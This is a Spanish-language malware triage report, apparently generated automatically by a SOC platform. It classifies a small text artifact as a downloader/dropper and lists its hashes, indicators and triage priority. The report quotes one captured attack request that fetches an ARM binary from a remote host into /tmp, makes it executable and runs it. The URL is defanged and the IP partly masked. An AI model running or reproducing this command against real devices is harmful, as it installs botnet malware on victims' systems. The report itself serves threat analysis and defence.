# 🧬 Payload Analysis

`196bfe338a07f1d568033efbce32a3606612ed513b1c6ec741e9cc0c3fb8621b`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Cambio de permisos. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:56:11+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `196bfe338a07f1d568033efbce32a3606612ed513b1c6ec741e9cc0c3fb8621b`
- **SHA1:** `d952437475a9227a9b322f53ca6fc27020361886`
- **MD5:** `2c0dae1b80a5749fdb54a58f315292ad`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 267 B |
| Entropía | 5.43 |
| Strings | 5 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**

## 🔬 Evidencia de clasificación

- Download indicators (wget/curl + /tmp)
- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
GET /shell?cd+/tmp;wget+hxxp://196.251.121.XXX/a3f8d2/kaizen.arm7sf_srv+-O+.k;chmod+777+.k;./.k HTTP/1.1
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 196.251.121.XXX | static_analysis |
| url | hxxp://196.251.121.XXX/a3f8d2/kaizen.arm7sf_srv+-O+.k;chmod+777+.k;./.k | strings |
| hash | 196bfe338a07f1d568033efbce32a3606612ed513b1c6ec741e9cc0c3fb8621b | static_analysis |
| command | GET /shell?cd+/tmp;wget+hxxp://196.251.121.XXX/a3f8d2/kaizen.arm7sf_srv+-O+.k;chmod+777+.k;./.k HTTP/1.1 | strings |
| ip | 170.155.2.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
